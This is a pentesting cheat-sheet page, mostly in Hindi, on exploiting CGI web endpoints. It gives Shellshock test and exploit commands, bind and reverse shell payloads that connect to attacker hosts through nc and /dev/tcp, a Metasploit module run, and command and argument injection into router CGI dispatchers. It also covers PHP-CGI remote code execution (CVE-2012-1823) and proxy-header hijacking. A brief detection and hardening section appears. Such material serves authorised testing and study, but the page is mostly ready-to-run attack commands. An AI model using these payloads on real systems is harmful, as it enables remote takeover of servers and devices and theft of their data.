# CGI Pentesting

{{#include ../../banners/hacktricks-training.md}}


## Information

The **CGI scripts are perl scripts**, इसलिए अगर आपने किसी सर्वर में पहुँच बना ली है जो _**.cgi**_ स्क्रिप्ट्स को execute कर सकता है तो आप **perl reverse shell** (`/usr/share/webshells/perl/perl-reverse-shell.pl`) अपलोड कर सकते हैं, एक्सटेंशन **.pl** से **.cgi** में बदल सकते हैं, execute permissions दे सकते हैं (`chmod +x`) और वेब ब्राउज़र से reverse shell को access करके execute कर सकते हैं।
CGI vulns की जांच के लिए `nikto -C all` \(and all the plugins\) का उपयोग करने की सलाह दी जाती है।

## **ShellShock**

**ShellShock** एक **vulnerability** है जो Unix-आधारित ऑपरेटिंग सिस्टम में व्यापक रूप से इस्तेमाल होने वाले **Bash** command-line shell को प्रभावित करती है। यह Bash की उस क्षमता को लक्षित करता है जो applications द्वारा पास किए गए commands को चलाती है। यह vulnerability **environment variables** के manipulation में निहित है, जो dynamic named values होते हैं और यह निर्धारित करते हैं कि कंप्यूटर पर processes कैसे चलते हैं। Attackers इसे exploit करके **malicious code** को environment variables में संलग्न कर सकते हैं, जो उस variable के प्राप्त होते ही execute हो जाता है। इससे attackers संभावित रूप से सिस्टम को compromise कर सकते हैं।

Exploiting this vulnerability the **page could throw an error**।

आप इस vulnerability को पा सकते हैं यह देखकर कि यह **old Apache version** और **cgi_mod** \(with cgi folder\) का उपयोग कर रहा है, या **nikto** का उपयोग करके।

### **Test**

अधिकांश टेस्ट echo करके कुछ भेजने पर आधारित होते हैं और उम्मीद करते हैं कि वह string वेब response में वापस मिलेगी। यदि आपको लगता है कि कोई पेज vulnerable हो सकता है, तो सभी cgi पेजों को खोजें और उनका परीक्षण करें।

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(reflected, blind and out-of-band\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
### Exploit
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
## केंद्रीकृत CGI डिस्पैचर (selector parameters के माध्यम से single endpoint रूटिंग)

कई embedded web UIs एक ही CGI endpoint (उदाहरण के लिए, `/cgi-bin/cstecgi.cgi`) के पीछे दर्जनों privileged actions को multiplex करती हैं और request को internal function तक route करने के लिए `topicurl=<handler>` जैसे selector parameter का उपयोग करती हैं।

Methodology to exploit these routers:

- Handler नामों की enumeration करें: JS/HTML scrape करें, wordlists से brute-force करें, या firmware unpack करके dispatcher में प्रयुक्त handler strings के लिए grep करें।
- Unauthenticated reachability टेस्ट करें: कुछ handlers auth checks भूल जाते हैं और सीधे callable होते हैं।
- उन handlers पर ध्यान केंद्रित करें जो system utilities invoke करते हैं या files को touch करते हैं; weak validators अक्सर सिर्फ कुछ characters को ही block करते हैं और leading hyphen `-` मिस कर सकते हैं।

सामान्य exploit पैटर्न:
```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# 1) Option/flag injection (no shell metacharacters): flip argv of downstream tools
topicurl=<handler>&param=-n

# 2) Parameter-to-shell injection (classic RCE) when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;

# 3) Validator bypass → arbitrary file write in file-touching handlers
topicurl=setWizardCfg&<crafted_fields>=/etc/init.d/S99rc
```
डिटेक्शन और हार्डनिंग:

- केंद्रीकृत CGI endpoints पर `topicurl` को संवेदनशील handlers पर सेट करके आने वाले बिना प्रमाणीकरण वाले अनुरोधों पर निगरानी रखें।
- `-` से शुरू होने वाले पैरामीटरों को चिह्नित करें (argv option injection प्रयास)।
- विक्रेताओं: सभी state-changing handlers पर प्रमाणीकरण लागू करें, कड़े allowlists/types/lengths से वैलिडेशन करें, और कभी भी user-controlled strings को command-line flags के रूप में पास न करें।

## पुराना PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

बुनियादी तौर पर अगर CGI सक्रिय है और PHP "पुराना" \(&lt;5.3.12 / &lt; 5.4.2\) है तो आप कोड निष्पादित कर सकते हैं।
इस vulnerability को exploit करने के लिए आपको वेब सर्वर की किसी PHP फाइल तक ऐसे पहुंचना होगा कि parameters न भेजे जाएँ \(विशेष रूप से '=' कैरेक्टर न भेजें\)।
फिर, इस vulnerability को टेस्ट करने के लिए आप उदाहरण के लिए `/index.php?-s` देख सकते हैं \(ध्यान दें `-s`\) और **एप्लिकेशन का स्रोत कोड response में दिखाई देगा**।

फिर, **RCE** प्राप्त करने के लिए आप इस विशेष क्वेरी को भेज सकते हैं: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` और निष्पादित होने वाला **PHP code** अनुरोध के **body** में होना चाहिए।
उदाहरण:
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**vuln और संभावित exploits के बारे में अधिक जानकारी:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**

## **Proxy \(MitM to Web server requests\)**

CGI प्रत्येक header के लिए http request में एक environment variable बनाता है। उदाहरण के लिए: "host:web.com" को "HTTP_HOST"="web.com" के रूप में बनाया जाता है।

चूँकि HTTP_PROXY variable को web server द्वारा उपयोग किया जा सकता है। एक **header** भेजने की कोशिश करें जिसमें यह हो: "**Proxy: &lt;IP_attacker&gt;:&lt;PORT&gt;**" और यदि सर्वर सेशन के दौरान कोई request करता है, तो आप सर्वर द्वारा की गई प्रत्येक request को capture कर पाएँगे।

## **References**

- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../../banners/hacktricks-training.md}}
